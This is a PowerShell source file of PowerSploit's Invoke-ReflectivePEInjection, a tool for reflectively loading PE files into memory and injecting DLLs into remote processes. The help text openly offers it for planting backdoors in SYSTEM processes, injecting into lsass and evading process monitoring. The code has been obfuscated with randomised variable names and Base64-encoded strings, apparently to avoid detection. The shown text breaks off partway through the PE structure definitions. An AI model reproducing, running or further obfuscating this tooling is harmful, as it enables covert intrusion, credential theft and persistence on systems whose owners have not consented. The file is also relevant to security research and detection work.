function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
remote process. 

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
	
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.
	
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${dd84f627e34042a19d0e69bbfb56125d},
	[Parameter(Position = 1)]
	[String[]]
	${ab7f34394b2a416094036841ab265c22},
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	${c6fed254ae924af494abfe759439ef04} = 'Void',
	[Parameter(Position = 3)]
	[String]
	${eae5ed9674894f6898fbef0835eef491},
	[Parameter(Position = 4)]
	[Int32]
	${d5db2eebed4843d5965cd466ea96af95},
	[Parameter(Position = 5)]
	[String]
	${ef8ec5899e654fb7ba1f4be16a82ddab},
    [Switch]
    ${af14924eb7024c53a36e0e49783042b6},
	[Switch]
	${ae505d2e9ab74e5393bb21ce1d2bddc4}
)
Set-StrictMode -Version 2
${7cfff7ba80834713864e9802dc916c76} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${dd84f627e34042a19d0e69bbfb56125d},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${c6fed254ae924af494abfe759439ef04},
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		${d5db2eebed4843d5965cd466ea96af95},
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${ef8ec5899e654fb7ba1f4be16a82ddab},
        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        ${af14924eb7024c53a36e0e49783042b6}
	)
	Function Get-Win32Types
	{
		${e39002e42e324234be4b9268daddc239} = New-Object System.Object
		${e564496d52b5421aab078e6f36a45254} = [AppDomain]::CurrentDomain
		${3244ad0ec739428ca82fd291499dbe73} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${21585474783d42b6bd0e0039fcee7f5e} = ${e564496d52b5421aab078e6f36a45254}.DefineDynamicAssembly(${3244ad0ec739428ca82fd291499dbe73}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${ee2479f604eb42af9bd823448f5f2d6a} = ${21585474783d42b6bd0e0039fcee7f5e}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${e6827bef1af843d3a1fb47b744ac54bb} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${ad24666288d443a1852365214deeaf43} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name MachineType -Value ${ad24666288d443a1852365214deeaf43}
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${53bb196677694558af8e39a2f19892c3} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name MagicType -Value ${53bb196677694558af8e39a2f19892c3}
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${7f63c76797d2439f826fdb19fdcfd66e} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${7f63c76797d2439f826fdb19fdcfd66e}
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${dd8e5e2bb1e341149d013fa6f029c84f} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${dd8e5e2bb1e341149d013fa6f029c84f}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 8)
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${62de2399b037479e8a6ddfda7a3c2f11} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${62de2399b037479e8a6ddfda7a3c2f11}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 20)
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${a03cb6013575431d83d70a231ebbe322} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${a03cb6013575431d83d70a231ebbe322}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 240)
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${53bb196677694558af8e39a2f19892c3}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
